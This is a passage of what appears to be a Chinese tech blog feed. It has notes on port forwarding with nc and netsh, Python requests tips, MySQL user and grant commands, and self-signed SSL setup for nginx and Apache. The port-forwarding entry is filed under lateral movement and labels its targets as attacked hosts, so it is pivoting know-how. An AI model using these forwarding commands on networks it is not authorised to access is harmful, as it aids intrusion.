    <content type="html"><![CDATA[<h1 id="linux"><a href="#linux" class="headerlink" title="linux"></a>linux</h1><p>利用nc进行本地端口转发，本地8888端口转发到22端口</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">nc</span> -lp <span class="hljs-number">8888</span> -c <span class="hljs-string">&quot;nc 127.0.0.1 22&quot;</span><br></code></pre></td></tr></table></figure><h1 id="window"><a href="#window" class="headerlink" title="window"></a>window</h1><h2 id="netsh"><a href="#netsh" class="headerlink" title="netsh"></a>netsh</h2><ul><li>netsh interface portproxy add v4tov4 listenaddress&#x3D;localaddress</li><li>listenport&#x3D;监听的端口</li><li>connectaddress&#x3D;被攻击者ip服务器</li><li>connectport&#x3D;被攻击者服务端口</li><li>protocol&#x3D;tcp</li></ul><p>查看转发规则</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs angelscript">netsh <span class="hljs-keyword">interface</span> <span class="hljs-symbol">portproxy</span> <span class="hljs-symbol">show</span> <span class="hljs-symbol">all</span><br></code></pre></td></tr></table></figure><p>侦听本地端口5555转发到指定ip的端口6666！</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">netsh<span class="hljs-built_in"> interface </span>portproxy <span class="hljs-built_in">add</span> v4tov4 <span class="hljs-attribute">listenport</span>=5555 <span class="hljs-attribute">connectaddress</span>=10.1.1.110 <span class="hljs-attribute">connectport</span>=6666<br></code></pre></td></tr></table></figure><p>删除指定的端口转发规则</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">netsh<span class="hljs-built_in"> interface </span>portproxy delete v4tov4 <span class="hljs-attribute">listenport</span>=5555 <span class="hljs-attribute">listenaddress</span>=10.1.1.110 <span class="hljs-attribute">connectport</span>=6666<br></code></pre></td></tr></table></figure><p>删除所有规则</p><pre><code class="hljs">netsh interface portproxy reset```</code></pre>]]></content>
    
    
    <categories>
      
      <category>网安</category>
      
      <category>内网横向</category>
      
    </categories>
    
    
    <tags>
      
      <tag>端口转发</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Python学习记录</title>
    <link href="/2024/05/14/%E7%BC%96%E7%A8%8B/Python%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"/>
    <url>/2024/05/14/%E7%BC%96%E7%A8%8B/Python%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/</url>
    
    <content type="html"><![CDATA[<h1 id="request库"><a href="#request库" class="headerlink" title="request库"></a>request库</h1><h2 id="解决requests无法访问https问题"><a href="#解决requests无法访问https问题" class="headerlink" title="解决requests无法访问https问题"></a>解决requests无法访问https问题</h2><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-comment"># verify=False</span><br>response = requests.<span class="hljs-built_in">get</span>(url,<span class="hljs-attribute">verify</span>=<span class="hljs-literal">False</span>)<br></code></pre></td></tr></table></figure><h2 id="requests允许跟随重定向"><a href="#requests允许跟随重定向" class="headerlink" title="requests允许跟随重定向"></a>requests允许跟随重定向</h2><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-comment"># allow_redirects=True</span><br>response = requests.<span class="hljs-built_in">get</span>(url,<span class="hljs-attribute">allow_redirects</span>=<span class="hljs-literal">True</span>)<br></code></pre></td></tr></table></figure><h2 id="关闭控制台输出建议提示"><a href="#关闭控制台输出建议提示" class="headerlink" title="关闭控制台输出建议提示"></a>关闭控制台输出建议提示</h2><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">requests<span class="hljs-selector-class">.packages</span><span class="hljs-selector-class">.urllib3</span><span class="hljs-selector-class">.disable_warnings</span>()<br></code></pre></td></tr></table></figure><h2 id="request发送到代理"><a href="#request发送到代理" class="headerlink" title="request发送到代理"></a>request发送到代理</h2><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stylus">proxy = &#123;<span class="hljs-string">&quot;http&quot;</span>:<span class="hljs-string">&quot;127.0.0.1:8080&quot;</span>,<span class="hljs-string">&quot;https&quot;</span>:<span class="hljs-string">&quot;127.0.0.1:8080&quot;</span>&#125;<br><br><span class="hljs-function"><span class="hljs-title">request</span><span class="hljs-params">(url,headers,proxies=proxy)</span></span><br></code></pre></td></tr></table></figure><h1 id="python项目打包成exe"><a href="#python项目打包成exe" class="headerlink" title="python项目打包成exe"></a>python项目打包成exe</h1><ol><li>安装Pyinstaller</li></ol><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmake">pip <span class="hljs-keyword">install</span> pyinstaller<br></code></pre></td></tr></table></figure><ol start="2"><li>进入到项目文件根目录，打开cmd窗口，开始打包</li></ol><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">pyinstaller -F <span class="hljs-tag">&lt;<span class="hljs-name">主程序py文件</span>&gt;</span> -p <span class="hljs-tag">&lt;<span class="hljs-name">py项目目录路径</span>&gt;</span><br></code></pre></td></tr></table></figure><blockquote><p>如果不需要命令行窗口交互，可选择加上<code>-w</code>参数屏蔽命令行窗口</p></blockquote><p>具体参数可参考下图</p><p><img src="/2024/05/14/%E7%BC%96%E7%A8%8B/Python%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/image.png" alt="alt text"></p><ol><li><p>经过漫长的跑马灯等待，最后一句提示：<code>Building EXE from EXE-00.toc completed successfully</code>，即表示打包完成</p></li><li><p>完成后在目录文件下会多出一个名为：<code>dist</code> 的文件夹，打开里面就可以找到exe文件了，其它文件可删除</p></li></ol><h1 id="获取当前文件路径"><a href="#获取当前文件路径" class="headerlink" title="获取当前文件路径"></a>获取当前文件路径</h1><p>适用于windows</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">pwd</span> <span class="hljs-operator">=</span> os.getcwd()<br></code></pre></td></tr></table></figure><h1 id="时间"><a href="#时间" class="headerlink" title="时间"></a>时间</h1><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-comment"># 获取当前时间</span><br><span class="hljs-attr">current_time</span> = datetime.datetime.now()<br></code></pre></td></tr></table></figure><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-comment"># 格式化时间为指定格式</span><br>formatted_time = current_time.strftime(<span class="hljs-string">&quot;%Y-%m-%d %H-%M-%S&quot;</span>)<br></code></pre></td></tr></table></figure><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-comment"># 输出格式化后的时间</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;当前时间：&#x27;</span>,formatted_time)<br></code></pre></td></tr></table></figure><h1 id="弹框选择文件"><a href="#弹框选择文件" class="headerlink" title="弹框选择文件"></a>弹框选择文件</h1><figure class="highlight elm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs elm"><span class="hljs-keyword">import</span> tkinter <span class="hljs-keyword">as</span> tk<br><span class="hljs-title">from</span> tkinter <span class="hljs-keyword">import</span> filedialog<br></code></pre></td></tr></table></figure><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">root</span> <span class="hljs-operator">=</span> tk.Tk()<br>root.withdraw()<br></code></pre></td></tr></table></figure><pre><code class="hljs"># 获取选择好的文件file_path = filedialog.askopenfilename()```</code></pre>]]></content>
    
    
    <categories>
      
      <category>编程</category>
      
    </categories>
    
    
    <tags>
      
      <tag>python</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SQL学习</title>
    <link href="/2024/05/14/%E7%BC%96%E7%A8%8B/SQL%E5%AD%A6%E4%B9%A0/"/>
    <url>/2024/05/14/%E7%BC%96%E7%A8%8B/SQL%E5%AD%A6%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<h1 id="用户操作"><a href="#用户操作" class="headerlink" title="用户操作"></a>用户操作</h1><h2 id="创建用户"><a href="#创建用户" class="headerlink" title="创建用户"></a>创建用户</h2><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql"><span class="hljs-keyword">create</span> <span class="hljs-keyword">user</span> <span class="hljs-string">&#x27;&lt;用户名&gt;&#x27;</span>@<span class="hljs-string">&#x27;&lt;host&gt;&#x27;</span> identified <span class="hljs-keyword">by</span> <span class="hljs-string">&#x27;&lt;密码&gt;&#x27;</span>;<br></code></pre></td></tr></table></figure><p>说明:</p><ul><li>host – 指定该用户在哪个主机上可以登陆,如果是本地用户可用localhost, 如果想让该用户可以从任意远程主机登陆,可以使用通配符%</li><li>如果想只让某个IP段的主机连接，可以修改为：<code>create user &#39;admin&#39;@&#39;192.168.100.%&#39; identified by &#39;password&#39;;</code></li></ul><h2 id="删除用户"><a href="#删除用户" class="headerlink" title="删除用户"></a>删除用户</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">drop</span> <span class="hljs-keyword">user</span> <span class="hljs-operator">&lt;</span>用户名<span class="hljs-operator">&gt;</span>; <span class="hljs-operator">/</span><span class="hljs-operator">/</span>默认情况下删除<span class="hljs-string">&#x27;username&#x27;</span>@<span class="hljs-string">&#x27;%&#x27;</span><br><span class="hljs-keyword">drop</span> <span class="hljs-keyword">user</span> <span class="hljs-string">&#x27;&lt;用户名&gt;&#x27;</span>@<span class="hljs-string">&#x27;&lt;host&gt;&#x27;</span>; <span class="hljs-operator">/</span><span class="hljs-operator">/</span>删除指定host的用户<br></code></pre></td></tr></table></figure><h2 id="修改用户密码"><a href="#修改用户密码" class="headerlink" title="修改用户密码"></a>修改用户密码</h2><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">mysqladmin -u <span class="hljs-keyword">admin</span> -h localhost -p <span class="hljs-keyword">password</span> &quot;password&quot;<br>mysqladmin -u &lt;<span class="hljs-keyword">user</span>&gt; -p &lt;<span class="hljs-keyword">password</span>&gt;<br></code></pre></td></tr></table></figure><h1 id="授权"><a href="#授权" class="headerlink" title="授权"></a>授权</h1><h2 id="添加授权"><a href="#添加授权" class="headerlink" title="添加授权"></a>添加授权</h2><figure class="highlight pf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pf">grant <span class="hljs-literal">all</span> <span class="hljs-keyword">on</span> <span class="hljs-variable">&lt;库名&gt;</span>.<span class="hljs-variable">&lt;表名&gt;</span> <span class="hljs-keyword">to</span> &#x27;<span class="hljs-variable">&lt;用户名&gt;</span>&#x27;@&#x27;<span class="hljs-variable">&lt;host&gt;</span>&#x27;;<br></code></pre></td></tr></table></figure><h2 id="撤销权限"><a href="#撤销权限" class="headerlink" title="撤销权限"></a>撤销权限</h2><figure class="highlight pf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pf">revoke <span class="hljs-variable">&lt;权限&gt;</span> <span class="hljs-keyword">on</span> <span class="hljs-variable">&lt;库名&gt;</span>.<span class="hljs-variable">&lt;表名&gt;</span> <span class="hljs-keyword">from</span> &#x27;<span class="hljs-variable">&lt;用户名&gt;</span>&#x27;@&#x27;<span class="hljs-variable">&lt;host&gt;</span>&#x27;;<br></code></pre></td></tr></table></figure><h2 id="查询某用户的授权情况"><a href="#查询某用户的授权情况" class="headerlink" title="查询某用户的授权情况"></a>查询某用户的授权情况</h2><figure class="highlight dart"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dart"><span class="hljs-keyword">show</span> grants <span class="hljs-keyword">for</span> <span class="hljs-string">&#x27;&lt;用户名&gt;&#x27;</span>@<span class="hljs-string">&#x27;&lt;host&gt;&#x27;</span>;<br></code></pre></td></tr></table></figure><p>说明: </p><ul><li>权限 – grant all为授予用户所有操作权限。可单独设置，如select , insert , update 等。</li><li>授权 – 如果要授予该用户对所有数据库和表的相应操作权限则可用 * 表示, 如 <em>.</em></li></ul><h2 id="刷新授权表"><a href="#刷新授权表" class="headerlink" title="刷新授权表"></a>刷新授权表</h2><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf">flush privileges<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><h1 id="创建库表"><a href="#创建库表" class="headerlink" title="创建库表"></a>创建库表</h1><h2 id="创建数据库"><a href="#创建数据库" class="headerlink" title="创建数据库"></a>创建数据库</h2><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql"><span class="hljs-keyword">create</span> <span class="hljs-keyword">database</span> &lt;库名&gt;；<br></code></pre></td></tr></table></figure><h2 id="创建数据表"><a href="#创建数据表" class="headerlink" title="创建数据表"></a>创建数据表</h2><figure class="highlight pf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pf">create <span class="hljs-built_in">table</span> <span class="hljs-variable">&lt;库名&gt;</span>.<span class="hljs-variable">&lt;表名&gt;</span> (<span class="hljs-variable">&lt;字段1 数据类型&gt;</span>,<span class="hljs-variable">&lt;字段2 数据类型&gt;</span>,......)；<br></code></pre></td></tr></table></figure><p><strong>示例：</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">create</span> <span class="hljs-keyword">table</span> users (<br>id <span class="hljs-type">int</span> auto_increment <span class="hljs-keyword">primary</span> key,<br>username <span class="hljs-type">varchar</span>(<span class="hljs-number">50</span>) <span class="hljs-keyword">not</span> <span class="hljs-keyword">null</span>,<br>phone <span class="hljs-type">varchar</span>(<span class="hljs-number">11</span>) <span class="hljs-keyword">not</span> <span class="hljs-keyword">null</span>,<br>email <span class="hljs-type">varchar</span>(<span class="hljs-number">100</span>) <span class="hljs-keyword">not</span> <span class="hljs-keyword">null</span>,<br>birthdate <span class="hljs-type">date</span>,<br>active <span class="hljs-type">boolean</span> <span class="hljs-keyword">default</span> <span class="hljs-literal">true</span><br>);<br></code></pre></td></tr></table></figure><p><strong>实例解析：</strong></p><ul><li>id: 用户 id，整数类型，自增长，作为主键。</li><li>username: 用户名，变长字符串，不允许为空。</li><li>phone: 用户手机号，数字整数，最大11位。</li><li>email: 用户邮箱，变长字符串，不允许为空。</li><li>birthdate: 用户的生日，日期类型。</li><li>active: 用户是否已经激活，布尔类型，默认值为 true。</li></ul><h2 id="常见数据类型"><a href="#常见数据类型" class="headerlink" title="常见数据类型"></a>常见数据类型</h2><table><tr><td>数据类型</td><td>描述</td></tr><tr><td>id</td><td>INT AUTO_INCREMENT PRIMARY KEY，整数类型，自增长，作为主键</td></tr><tr><td>integer(size) </td><td rowspan="4">仅容纳整数。在括号内规定数字的最大位数。</td></tr><tr><td>int(size) </td></tr><tr><td>smallint(size) </td></tr><tr><td>tinyint(size) </td></tr><tr><td>decimal(size,d) </td><td rowspan="2">容纳带有小数的数字。size 规定数字的最大位数。”d” 规定小数点右侧的最大位数。</td></tr><tr><td>numeric(size,d) </td></tr><tr><td>varchar(size) </td><td>容纳可变长度的字符串（可容纳字母、数字以及特殊的字符）。</td></tr><tr><td>date(yyyymmdd) </td><td>容纳日期。</td></tr><tr><td>is_active</td><td>布尔类型，默认值为 true</td></tr></table><h1 id="增删查改"><a href="#增删查改" class="headerlink" title="增删查改"></a>增删查改</h1><h2 id="查"><a href="#查" class="headerlink" title="查"></a>查</h2><figure class="highlight dart"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dart"><span class="hljs-keyword">show</span> databases; <span class="hljs-comment">//查询当前空间下所有库</span><br></code></pre></td></tr></table></figure><figure class="highlight dart"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dart"><span class="hljs-keyword">show</span> tabses; <span class="hljs-comment">//查询当前库下所有表</span><br></code></pre></td></tr></table></figure><figure class="highlight axapta"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs axapta"><span class="hljs-keyword">desc</span> &lt;表名&gt;; <span class="hljs-comment">//查询表的字段结构</span><br></code></pre></td></tr></table></figure><figure class="highlight pf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pf">select <span class="hljs-variable">&lt;值&gt;</span> <span class="hljs-keyword">from</span> <span class="hljs-variable">&lt;库&gt;</span>.<span class="hljs-variable">&lt;表&gt;</span>; //查询某列值，可以写多个值，以逗号分隔；也可以用通配符“*”查询所有值。<br></code></pre></td></tr></table></figure><figure class="highlight pf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pf">select <span class="hljs-variable">&lt;值&gt;</span> <span class="hljs-keyword">from</span> <span class="hljs-variable">&lt;库&gt;</span>.<span class="hljs-variable">&lt;表&gt;</span> where <span class="hljs-variable">&lt;值&gt;</span>=<span class="hljs-variable">&lt;值&gt;</span>; //查询某行值，where后跟上定位条件，和select查询的某列值形成and的关系。<br></code></pre></td></tr></table></figure><h2 id="增"><a href="#增" class="headerlink" title="增"></a>增</h2><figure class="highlight bnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bnf">insert into <span class="hljs-attribute">&lt;库&gt;</span>.<span class="hljs-attribute">&lt;表&gt;</span> (<span class="hljs-attribute">&lt;列1&gt;</span>,<span class="hljs-attribute">&lt;列2&gt;</span>) values (<span class="hljs-attribute">&lt;&#x27;新值1&#x27;&gt;</span>,<span class="hljs-attribute">&lt;&#x27;新值2&#x27;&gt;</span>，......);<br></code></pre></td></tr></table></figure><h2 id="改"><a href="#改" class="headerlink" title="改"></a>改</h2><figure class="highlight pf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pf">update <span class="hljs-variable">&lt;库&gt;</span>.<span class="hljs-variable">&lt;表&gt;</span> <span class="hljs-built_in">set</span> <span class="hljs-variable">&lt;列&gt;</span>=<span class="hljs-variable">&lt;&#x27;新值&#x27;&gt;</span> where <span class="hljs-variable">&lt;列&gt;</span>=<span class="hljs-variable">&lt;&#x27;值&#x27;&gt;</span>;<br></code></pre></td></tr></table></figure><h2 id="删"><a href="#删" class="headerlink" title="删"></a>删</h2><figure class="highlight pf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pf">delete <span class="hljs-keyword">from</span> <span class="hljs-variable">&lt;库&gt;</span>.<span class="hljs-variable">&lt;表&gt;</span> where <span class="hljs-variable">&lt;列&gt;</span>=<span class="hljs-variable">&lt;&#x27;值&#x27;&gt;</span>； //删除某行<br></code></pre></td></tr></table></figure><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gradle"><span class="hljs-keyword">delete</span> <span class="hljs-keyword">from</span> &lt;库&gt;.&lt;表&gt;; 或 <span class="hljs-keyword">delete</span> * <span class="hljs-keyword">from</span> &lt;表&gt;； <span class="hljs-comment">//删除所有行</span><br></code></pre></td></tr></table></figure><figure class="highlight pf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pf"><span class="hljs-keyword">drop</span> <span class="hljs-built_in">table</span> <span class="hljs-variable">&lt;库&gt;</span>.<span class="hljs-variable">&lt;表&gt;</span>； //删除表<br></code></pre></td></tr></table></figure><figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gauss"><span class="hljs-built_in">drop</span> database &lt;库&gt;； <span class="hljs-comment">//删除库</span><br></code></pre></td></tr></table></figure><h1 id="常见问题"><a href="#常见问题" class="headerlink" title="常见问题"></a>常见问题</h1><h2 id="解决3306无法远程连接问题"><a href="#解决3306无法远程连接问题" class="headerlink" title="解决3306无法远程连接问题"></a>解决3306无法远程连接问题</h2><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">vim</span> /etc/mysql/mysql.<span class="hljs-keyword">conf</span>.d/mysqld.<span class="hljs-keyword">cnf</span><br></code></pre></td></tr></table></figure><p>将“bind-address &#x3D; 127.0.0.1”这行注释</p><h2 id="删除用户名为空的用户"><a href="#删除用户名为空的用户" class="headerlink" title="删除用户名为空的用户"></a>删除用户名为空的用户</h2><p>以root账户登录MySQL，需输入root密码</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">mysql -u root -<span class="hljs-selector-tag">p</span><br></code></pre></td></tr></table></figure><p>选择mysql库</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf">use mysql<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><p>删除账号为空账户</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql"><span class="hljs-keyword">delete</span> <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">where</span> <span class="hljs-keyword">User</span>=<span class="hljs-string">&#x27;&#x27;</span>;<br></code></pre></td></tr></table></figure><p>刷新权限</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf">flush privileges<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><p>退出</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-keyword">exit</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>编程</category>
      
    </categories>
    
    
    <tags>
      
      <tag>sql</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>自签名ssl证书并配置https</title>
    <link href="/2024/05/14/WEB/%E8%87%AA%E7%AD%BE%E5%90%8Dssl%E8%AF%81%E4%B9%A6%E5%B9%B6%E9%85%8D%E7%BD%AEhttps/"/>
    <url>/2024/05/14/WEB/%E8%87%AA%E7%AD%BE%E5%90%8Dssl%E8%AF%81%E4%B9%A6%E5%B9%B6%E9%85%8D%E7%BD%AEhttps/</url>
    
    <content type="html"><![CDATA[<h1 id="证书格式"><a href="#证书格式" class="headerlink" title="证书格式"></a>证书格式</h1><p>SSL证书有多种格式：</p><ol><li>Apache、Nginx等，使用OpenSSL提供的密码库，生成pem、key、crt等格式的证书文件。</li><li>Tomcat、Weblogic、JBoss等，使用Java提供的密码库。通过Java的Keytool工具，生成Java Keystore（jks）格式的证书文件。</li></ol><p><code>常用证书格式信息：</code></p><ul><li><em>.der，</em>.cer，*.crt 以二进制形式存放证书，只有公钥，不包含私钥。</li><li>*.csr 证书请求，这个是需要发给CA用来签名正式证书用的。</li><li>*.pem 一般是文本格式，可以放证书或私钥，或者两者都包含。 *.PEM如果只包含私钥，那一般用 *.KEY代替。</li><li><em>.pfx，</em>.p12 是二进制格式，同时含证书和私钥，一般有密码保护。</li></ul><h1 id="生成证书"><a href="#生成证书" class="headerlink" title="生成证书"></a>生成证书</h1><p>在linux环境下，需要openssl依赖，键入以下命令。</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">sudo openssl req -x509 -nodes -days <span class="hljs-number">3650</span> -newkey rsa:<span class="hljs-number">2048</span> -keyout <span class="hljs-regexp">/etc/</span>ssl<span class="hljs-regexp">/private/</span>ssl-cert-snakeoil.key -out <span class="hljs-regexp">/etc/</span>ssl<span class="hljs-regexp">/certs/</span>ssl-cert-snakeoil.crt<br></code></pre></td></tr></table></figure><p>命令解释</p><ul><li><p>openssl：这是用于创建和管理OpenSSL证书，密钥和其他文件的基本命令行工具。</p></li><li><p>req：此子命令指定我们要使用X.509证书签名请求（CSR）管理。“X.509”是SSL和TLS为其密钥和证书管理所遵循的公钥基础结构标准。因为我们想要创建一个新的X.509证书，所以我们使用这个子命令。</p></li><li><p>-x509：这通过告诉实用程序我们要创建自签名证书而不是生成证书签名请求来进一步修改上一个子命令。</p></li><li><p>-nodes：这告诉OpenSSL跳过用密码保护我们的证书的选项。我们需要中间件在服务器启动时能够在没有用户干预的情况下读取文件。</p></li><li><p>-days 3650：此选项设置证书有效的时间长度。我们在这里设置了10年。</p></li><li><p>-newkey rsa:2048：这指定我们要同时生成新证书和新密钥。我们没有创建在上一步中签署证书所需的密钥，因此我们需要将其与证书一起创建。rsa:2048部分告诉它制作一个2048位长的RSA密钥。</p></li><li><p>-keyout：这一行告诉OpenSSL在哪里放置我们正在创建的生成的私钥文件。</p></li><li><p>-out：这告诉OpenSSL在哪里放置我们正在创建的证书。</p></li></ul><p>最重要的一行是请求 <code>Common Name (e.g. server FQDN or YOURname)</code> 的这行。您需要输入与服务器关联的域名或公网IP。</p><p>您创建的两个文件都将放在 <code>/etc/ssl</code> 目录下。</p><h1 id="配置证书"><a href="#配置证书" class="headerlink" title="配置证书"></a>配置证书</h1><h2 id="nginx配置ssl证书"><a href="#nginx配置ssl证书" class="headerlink" title="nginx配置ssl证书"></a>nginx配置ssl证书</h2><p>修改配置文件 <code>/etc/nginx/sites-available/default</code>的server段</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-section">server</span> &#123;<br>    <span class="hljs-attribute">listen</span> <span class="hljs-number">800</span> ssl;<br>    <span class="hljs-attribute">listen</span> [::]:<span class="hljs-number">800</span> ssl;<br>    <span class="hljs-attribute">error_page</span> <span class="hljs-number">497</span> https://<span class="hljs-variable">$host</span>:800<span class="hljs-variable">$request_uri</span>; <span class="hljs-comment">#http强制重定向到https</span><br><br>    <span class="hljs-attribute">ssl_certificate</span>  /etc/ssl/certs/ssl-cert-snakeoil.crt;  <span class="hljs-comment">#证书路径</span><br>    <span class="hljs-attribute">ssl_certificate_key</span> /etc/ssl/private/ssl-cert-snakeoil.key;  <span class="hljs-comment">#私钥路径</span><br><br>&#125;<br><br></code></pre></td></tr></table></figure><h2 id="apache配置ssl证书"><a href="#apache配置ssl证书" class="headerlink" title="apache配置ssl证书"></a>apache配置ssl证书</h2><p>使用 <code>a2enmod</code> 命令启用 <code>mod_sslApache SSL</code> 模块，如果要关闭ssl则是执行：<code>sudo a2enmod ssl</code> 命令：</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">sudo</span> a2enmod ssl<br></code></pre></td></tr></table></figure><p>使用a2ensite命令启用SSL主机：</p><figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs actionscript">sudo a2ensite <span class="hljs-keyword">default</span>-ssl<br></code></pre></td></tr></table></figure><p>修改apache配置文件，将 <code>SSLCertificateFile</code> 和 <code>SSLCertificateKeyFile</code> 这两行的路径更改为实际的证书位置路径，如下图所示。</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gradle">vim <span class="hljs-regexp">/etc/</span>apache2<span class="hljs-regexp">/sites-available/</span><span class="hljs-keyword">default</span>-ssl.conf<br></code></pre></td></tr></table></figure><p><img src="/2024/05/14/WEB/%E8%87%AA%E7%AD%BE%E5%90%8Dssl%E8%AF%81%E4%B9%A6%E5%B9%B6%E9%85%8D%E7%BD%AEhttps/image.png" alt="alt text"></p><p>启用我们的ssl-params.conf文件，读入我们设置的值：</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">sudo a2enconf ssl-<span class="hljs-keyword">params</span><br></code></pre></td></tr></table></figure><p>检查配置是否无误，如果输出中包含输出 <code>Syntax OK</code> ，则表示配置文件没有语法错误</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">sudo</span> apache2ctl 